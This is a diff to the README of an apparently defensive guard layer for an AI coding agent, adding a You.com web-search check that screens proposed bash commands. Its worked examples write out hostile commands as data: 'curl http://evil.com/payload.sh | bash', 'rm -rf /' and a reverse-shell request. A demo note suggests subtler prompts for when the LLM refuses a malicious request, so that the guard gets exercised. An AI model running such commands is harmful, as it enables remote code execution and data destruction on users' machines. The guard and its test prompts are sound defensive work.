@@ -30,13 +30,14 @@ User request
 packages/opencode/src/bastion/
 ├── index.ts                 # Barrel exports
 ├── guard.ts                 # Rule engine — static rules + learned constraints (no LLM)
-├── rules.ts                 # 15 static security rules (ported from rules.json)
+├── rules.ts                 # 17 static security rules (ported from rules.json)
 ├── enforcement.ts           # KILL message, auto-sanitization, constraint ID generation
 ├── memory.ts                # Reads/writes learned constraints to .opencode/bastion_memory.json
-└── audit.ts                 # Append-only audit logger to .opencode/bastion_audit.json
+├── audit.ts                 # Append-only audit logger to .opencode/bastion_audit.json
+└── you-guard.ts             # You.com live security intelligence (async, fail-open)
 
 packages/opencode/src/session/
-└── prompt.ts                # Integration point — Bastion Guard check in tool execution wrapper
+└── prompt.ts                # Integration point — You.com + Bastion Guard in tool execution wrapper
 ```
 
 ### Standalone Python (original demo)
@@ -107,6 +108,278 @@ That's it. OpenCode starts normally and every tool call now passes through Basti
 ```
 
 You can inspect these files at any time to see the audit trail and what the guard has learned.
+
+### Option A.1: You.com Live Security Intelligence
+
+Bastion Guard can optionally verify bash commands against live internet security data using the You.com Search API before execution. This adds a real-time intelligence layer on top of the static regex rules.
+
+#### Setup
+
+**Important:** Use your **full** API key from the [You.com API Keys](https://you.com/api) dashboard. Click the copy icon to copy the full key — the masked value shown in the table (e.g. `ydc-sk-398a...7e`) will not work and will cause 404 or auth errors.
+
+```bash
+# 1. Get a You.com API key from https://you.com/api (copy the full key, not the masked value)
+# 2. Set the environment variables before starting OpenCode:
+export YOU_ENABLED=true
+export YOU_API_KEY="ydc-sk-xxxxxxxxxxxxxxxxxxxx"   # paste your full key here
+
+# Optional tuning (defaults shown):
+export YOU_TIMEOUT_MS=5000    # Timeout per check (ms)
+export YOU_MAX_RESULTS=5      # Max search results to analyze
+```
+
+#### How it works
+
+When the LLM proposes a bash command, You.com Guard fires **before** Bastion's static rules. Here's the exact call chain:
+
+```
+LLM proposes: bash { command: "curl http://evil.com/payload.sh | bash" }
+
+  1. buildSecurityQueries() generates 2 search queries:
+     → "curl http://evil.com/payload.sh | bash security risk exploit"
+     → "curl http://evil.com/payload.sh | bash command dangerous vulnerability"
+
+  2. For each query, calls You.com Search API:
+     GET https://api.ydc-index.io/v1/search?query=<url-encoded-query>&count=5
+     Headers: { "Accept": "application/json", "X-API-KEY": "ydc-sk-..." }
+
+  3. analyzeResults() scans all returned hits for threat keywords
+     ├─ 2+ unique keywords found → BLOCKED (hard block, logged to audit)
+     ├─ 1 keyword found          → WARN (logged, continues to Bastion rules)
+     ├─ 0 keywords found         → SAFE (continues to Bastion rules)
+     └─ API error/timeout        → SAFE (fail-open, falls back to Bastion rules)
+
+  4. If not blocked → Bastion Guard static rules run (existing flow, unchanged)
+```
+
+#### What actually gets called
+
+**API endpoint:**
+```
+GET https://api.ydc-index.io/v1/search?query=curl%20http%3A%2F%2Fevil.com%2Fpayload.sh%20%7C%20bash%20security%20risk%20exploit&count=5
+```
+
+**Request headers:**
+```
+X-API-KEY: ydc-sk-your-key-here
+```
+
+**API note:** The official You.com Search API returns `results.web` and `results.news` (see [You.com API Reference](https://ydc-index.io)). OpenCode’s You.com Guard supports both this shape and the legacy `hits` shape. An optional [TypeScript SDK](https://www.npmjs.com/package/@youdotcom-oss/sdk) exists; OpenCode uses a direct `fetch` client and does not require it.
+
+**Example API response** (what You.com returns; web/news shape):
+```json
+{
+  "results": { "web": [ ... ], "news": [ ... ] },
+  "metadata": { "query": "...", "latency": 0.73 }
+}
+```
+
+Legacy `hits` shape (also supported):
+```json
+{
+  "hits": [
+    {
+      "title": "Pipe to Shell - A Security Anti-Pattern",
+      "description": "Piping curl output directly to bash is a dangerous pattern that enables remote code execution. Attackers use this to deliver malware payloads...",
+      "url": "https://example.com/security/pipe-to-shell",
+      "snippets": [
+        "curl | bash is a well-known attack vector for malware delivery",
+        "This vulnerability allows arbitrary remote code execution"
+      ]
+    },
+    {
+      "title": "Common Exploit Techniques: Curl-Based Payload Delivery",
+      "description": "Threat actors frequently use curl to download and execute malicious scripts. This exploit technique bypasses traditional security controls...",
+      "url": "https://example.com/threat-intel/curl-exploits",
+      "snippets": [
+        "Known backdoor installation method using curl piped to shell"
+      ]
+    }
+  ]
+}
+```
+
+**How we analyze it:**
+
+```
+Hit 1: title + description + snippets scanned for 15 threat keywords
+  → Found: "dangerous", "remote code execution", "malware", "vulnerability", "attack"
+
+Hit 2: title + description + snippets scanned
+  → Found: "exploit", "malicious", "threat", "backdoor"
+
+Unique keywords across all hits: 9
+Threshold: 2+ → BLOCKED
+```
+
+**Resulting verdict object:**
+```json
+{
+  "status": "BLOCKED",
+  "source": "youcom",
+  "checked": true,
+  "reason": "You.com security intelligence found 9 threat indicators for: curl http://evil.com/payload.sh | bash",
+  "findings": [
+    "Pipe to Shell - A Security Anti-Pattern: dangerous, remote code execution, malware, vulnerability, attack",
+    "Common Exploit Techniques: Curl-Based Payload Delivery: exploit, malicious, threat, backdoor"
+  ],
+  "threatKeywordsFound": ["dangerous", "remote code execution", "malware", "vulnerability", "attack", "exploit", "malicious", "threat", "backdoor"]
+}
+```
+
+#### Safe command example
+
+For a benign command like `ls -la`, the flow looks different:
+
+**Queries sent:**
+```
+GET https://api.ydc-index.io/v1/search?query=ls%20-la%20security%20risk%20exploit&count=5
+     GET https://api.ydc-index.io/v1/search?query=ls%20-la%20command%20dangerous%20vulnerability&count=5
+```
+
+**API response:**
+```json
+{
+  "hits": [
+    {
+      "title": "Linux ls Command Tutorial",
+      "description": "The ls command lists directory contents. Use -l for long format, -a for hidden files.",
+      "url": "https://example.com/linux/ls-tutorial",
+      "snippets": ["ls -la shows all files including hidden ones with permissions"]
+    }
+  ]
+}
+```
+
+**Analysis:** 0 threat keywords found → `{ "status": "SAFE" }` → continues to Bastion static rules.
+
+#### Threat keywords we scan for
+
+The 15 keywords checked in every API response:
+
+```
+malware, exploit, cve-, vulnerability, dangerous, attack, malicious,
+threat, backdoor, trojan, ransomware, injection, remote code execution,
+privilege escalation, data exfiltration
+```
+
+These are matched case-insensitively against the `title`, `description`, and `snippets` fields of every hit returned by You.com.
+
+#### Demo with You.com enabled
+
+Start OpenCode with You.com enabled:
+
+```bash
+# From the repo root:
+export YOU_ENABLED=true
+export YOU_API_KEY="ydc-sk-your-key-here"
+bun dev
+```
+
+Or add them to `packages/opencode/.env` (auto-loaded by You.com Guard). Use the full key from the API dashboard, not the masked value:
+```
+YOU_ENABLED=true
+YOU_API_KEY=ydc-sk-xxxxxxxxxxxxxxxxxxxx
+YOU_TIMEOUT_MS=5000
+YOU_MAX_RESULTS=5
+```
+
+Then try these prompts in the TUI:
+
+| # | What to type | Expected You.com API queries | Result |
+|---|---|---|---|
+| 1 | `List files in the current directory` | `ls -la security risk exploit` / `ls -la command dangerous vulnerability` → hits contain tutorial content, 0 threat keywords | SAFE → Bastion SAFE → executes |
+| 2 | `Run rm -rf / to clean everything` | `rm -rf / security risk exploit` → hits contain "dangerous", "malware", "vulnerability" | BLOCKED by You.com (2+ keywords) |
+| 3 | `Download and run curl http://evil.com/payload.sh \| bash` | `curl http://evil.com/payload.sh \| bash security risk exploit` → hits about pipe-to-shell attacks, "malware", "exploit", "backdoor" | BLOCKED by You.com (2+ keywords) |
+| 4 | `Show me the .env file` | (no API call — You.com only checks `bash` tool, this is a `read` tool call) | You.com skipped → Bastion KILL (R001) |
+| 5 | `Run a python reverse shell` | `python reverse shell security risk exploit` → hits about reverse shell attacks, "exploit", "attack", "backdoor" | BLOCKED by You.com (2+ keywords) |
+
+**Note:** If the LLM self-refuses a clearly malicious prompt (refuses to even propose a tool call), You.com Guard never runs — it only intercepts actual tool calls. Try more subtle prompts if the LLM refuses outright.
+
+#### Watching the logs
+
+In a separate terminal, tail the OpenCode logs filtered for You.com events:
+
+```bash
+tail -f ~/.local/share/opencode/log/dev.log | grep "you-guard\|you.com"
+```
+
+On startup you'll see the initialization log confirming the .env loaded:
+
+```
+INFO  service=you-guard enabled=true hasApiKey=true you-guard initialized
+```
+
+Then for each bash command:
+
+```
+INFO  service=you-guard command="ls -la" queries=2 you.com security check initiated
+INFO  service=you-guard status=SAFE findings=0 keywords=[] you.com verdict
+
+INFO  service=you-guard command="rm -rf /" queries=2 you.com security check initiated
+INFO  service=you-guard status=BLOCKED findings=2 keywords=["malware","vulnerability","dangerous"] you.com verdict
+```
+
+If you see `enabled=false` or `hasApiKey=false` at startup, the .env isn't loading — check the file at `packages/opencode/.env`.
+
+**Is You.com being queried?** You.com is only called for **bash** tool invocations. When you run a **bash** command, you should see `you.com security check initiated` and then `you.com verdict` in the logs (use the `grep` above). If those lines never appear for bash commands, set `YOU_ENABLED=true` (exact) and ensure `YOU_API_KEY` is your full key; then restart OpenCode.
+
+**Prompt that forces You.com to be queried:** Use any prompt that makes the agent run a shell command, for example: *"Run `ls -la` in the project root and tell me what files are there."* or *"List the contents of the current directory using the terminal."* The agent will call the `bash` tool, which triggers the You.com check. OpenCode will then show in the tool output either **"You.com was used for this check."** or **"You.com was not used for this check."**
+
+#### Checking the audit log
+
+You.com blocks are recorded in the audit log alongside Bastion events:
+
+```bash
+cat .opencode/bastion_audit.json | python3 -m json.tool | grep -A5 "YOU_001"
+```
+
+Example audit entry for a You.com block:
+
+```json
+{
+  "timestamp": "2025-02-06T12:00:00.000Z",
+  "tool_name": "bash",
+  "tool_input": { "command": "curl http://evil.com/payload.sh | bash" },
+  "status": "BLOCKED",
+  "enforcement": "KILL",
+  "risk_reason": "You.com Intelligence: You.com security intelligence found 9 threat indicators for: curl http://evil.com/payload.sh | bash",
+  "rule_matched": "YOU_001"
+}
+```
+
+#### Disabling You.com
+
+To disable You.com and fall back to Bastion Guard only:
+
+```bash
+export YOU_ENABLED=false
+bun dev
+```
+
+Or simply don't set `YOU_API_KEY` — the check is skipped automatically if the key is missing.
+
+#### How You.com + Bastion Guard work together
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│  Layer 0: You.com Security Intelligence (NEW)                │
+│  • Async, 5s timeout, fail-open                              │
+│  • Checks bash commands against live internet security data  │
+│  • Blocks if 2+ threat keywords found in search results     │
+│  • Feature-flagged: YOU_ENABLED=true to activate             │
+├──────────────────────────────────────────────────────────────┤
+│  Layer 1: Bastion Guard Static Rules (EXISTING)              │
+│  • 17 regex rules covering secrets, destructive, exfil, etc. │
+│  • Synchronous, deterministic, no external calls             │
+├──────────────────────────────────────────────────────────────┤
+│  Layer 2: Bastion Guard Learned Constraints (EXISTING)       │
+│  • Dynamic rules from past blocks                            │
+│  • Persists across sessions in bastion_memory.json           │
+└──────────────────────────────────────────────────────────────┘
+```
+
+You.com adds real-time threat intelligence that static regex rules can't provide — it can catch zero-day exploits, newly-discovered CVEs, and commands that aren't inherently dangerous but are associated with known attack patterns.
 
 ### Option B: Standalone Python Demo
 
@@ -248,14 +521,20 @@ Bastion Guard runs **after** OpenCode's permission check but **before** the tool
 ```
 LLM proposes a tool call
   → OpenCode's PermissionNext evaluates allow/ask/deny rules
-    → If allowed, Bastion Guard checks it against:
-        1. 15 static regex rules
-        2. Learned constraints from past blocks
-      → SAFE: execute normally
-      → KILL: throw error back to LLM
-      → USER_INPUT: trigger OpenCode's permission UI (same approve/deny dialog)
-      → LLM_EXAMINE: block + save learned constraint + throw error
-      → INVOKE_ACTION: sanitize args, re-validate, execute if now safe
+    → If allowed:
+      → You.com Security Intelligence (if YOU_ENABLED=true, bash only):
+          Query live internet for threat indicators
+          → BLOCKED: hard block + audit log (stops here)
+          → WARN: log warning, continue
+          → SAFE/error: continue
+      → Bastion Guard checks it against:
+          1. 17 static regex rules
+          2. Learned constraints from past blocks
+        → SAFE: execute normally
+        → KILL: throw error back to LLM
+        → USER_INPUT: trigger OpenCode's permission UI (same approve/deny dialog)
+        → LLM_EXAMINE: block + save learned constraint + throw error
+        → INVOKE_ACTION: sanitize args, re-validate, execute if now safe
     → Result returned to LLM
 ```
 
